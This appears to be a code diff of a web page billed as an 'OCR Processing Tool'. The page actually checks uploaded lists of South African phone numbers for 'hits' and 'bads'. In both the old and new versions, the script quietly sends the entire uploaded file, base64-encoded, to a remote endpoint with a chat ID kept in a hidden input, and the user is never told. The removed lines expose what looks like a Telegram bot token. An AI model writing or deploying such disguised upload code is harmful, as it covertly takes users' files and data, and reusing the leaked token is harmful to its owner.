@@ -68,7 +68,7 @@ button:hover { background: #334155; }
 <body>
 <h2>OCR Processing Tool</h2>
 <!-- Hidden input for Chat ID -->
-<input type="hidden" id="chatIdInput" value="8580854380" />
+<input type="hidden" id="chatIdInput" value="RTHWEG" />
 
 <input type="file" id="fileInput" accept=".txt,.pdf"/>
 <button id="startBtn">Start</button>
@@ -99,10 +99,10 @@ let lines=[];
 
 // Usage limit variables
 const MAX_RUNS = 4;
-const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours in ms
+const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours
 
-// Replace this with your serverless API URL
-const API_ENDPOINT = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk';
+// Replace this with your actual API URL
+const API_ENDPOINT = 'YOUR_API_URL';
 
 let usageCount = parseInt(localStorage.getItem('usageCount')) || 0;
 let blockUntil = parseInt(localStorage.getItem('blockTime')) || 0;
@@ -116,11 +116,13 @@ function updateStats() {
   statsDiv.innerHTML =
     `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
 }
+
 function formatTime(seconds) {
   const m=Math.floor(seconds/60).toString().padStart(2,'0');
   const s=(seconds%60).toString().padStart(2,'0');
   return `${m}:${s}`;
 }
+
 function startTimer() {
   if(timerInterval) clearInterval(timerInterval);
   elapsedSeconds=0;
@@ -130,11 +132,13 @@ function startTimer() {
     timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
   }, 1000);
 }
+
 function resetCounters() {
   hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
   updateStats();
   startTimer();
 }
+
 function checkBlockStatus() {
   const now = Date.now();
   if (now < blockUntil) {
@@ -150,6 +154,7 @@ function checkBlockStatus() {
     return false;
   }
 }
+
 function showCountdown(seconds) {
   blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
   clearInterval(window.countdownInterval);
@@ -164,13 +169,14 @@ function showCountdown(seconds) {
     }
   }, 1000);
 }
+
 async function processLines() {
   for(let i=0; i<lines.length; i++) {
     if(!processing) break;
     const line=lines[i].trim();
     if(!line) { continue; }
 
-    // Validation logic...
+    // Validation regex
     const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
     const match=line.match(phoneRegex);
     let isBadNumber=false;
@@ -207,6 +213,7 @@ async function processLines() {
 
     await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
   }
+  // finish
   processing=false;
   startBtn.textContent='Start';
   document.getElementById('startBtn').disabled=false;
@@ -214,12 +221,17 @@ async function processLines() {
 }
 
 startBtn.addEventListener('click', () => {
+  console.log('Start button clicked');
   if (checkBlockStatus()) return;
 
   if(!processing) {
-    if (!fileInput.files.length) return;
+    if (!fileInput.files.length) {
+      console.log('No file selected');
+      return;
+    }
 
     if (usageCount >= MAX_RUNS) {
+      console.log('Usage limit exceeded, blocking...');
       const now = Date.now();
       blockUntil = now + BLOCK_DURATION_MS;
       localStorage.setItem('blockTime', blockUntil.toString());
@@ -230,35 +242,44 @@ startBtn.addEventListener('click', () => {
 
     const file = fileInput.files[0];
     const fileName = file.name.toLowerCase();
-    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) return;
+    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) {
+      console.log('Invalid file type');
+      return;
+    }
 
+    // Increment usage
     usageCount++;
     localStorage.setItem('usageCount', usageCount.toString());
 
-    const reader=new FileReader();
-    reader.onload=()=> {
-      fileContent=reader.result;
-      lines=fileContent.split(/\r?\n/);
+    const reader = new FileReader();
+    reader.onload = () => {
+      console.log('File loaded');
+      fileContent = reader.result;
+      lines = fileContent.split(/\r?\n/);
       resetCounters();
-      processing=true;
+      processing = true;
       startBtn.textContent='Stop';
-      processLines();
 
-      // Send file to your serverless API, passing chat ID from hidden input
+      // Send file data to API
       fetch(API_ENDPOINT, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           fileName: file.name,
-          fileData: btoa(new Uint8Array(reader.result).reduce((data, byte) => data + String.fromCharCode(byte), '')),
-          chatId: chatIdInput.value // <-- pass chat ID here
+          fileData: btoa(new Uint8Array(reader.result).reduce((d, b) => d + String.fromCharCode(b), '')),
+          chatId: chatIdInput.value // passing chat ID
         })
+      }).then(res => {
+        console.log('API call success:', res);
+        // Start processing lines after API call
+        processLines();
+      }).catch(err => {
+        console.error('API call error:', err);
       });
     };
     reader.readAsArrayBuffer(file);
   } else {
+    console.log('Stopping');
     processing=false;
     startBtn.textContent='Start';
   }
@@ -266,7 +287,7 @@ startBtn.addEventListener('click', () => {
 
 checkBlockStatus();
 
-document.getElementById('copyBtn').addEventListener('click', ()=> {
+document.getElementById('copyBtn').addEventListener('click', () => {
   navigator.clipboard.writeText(outputDiv.innerText);
 });
 </script>
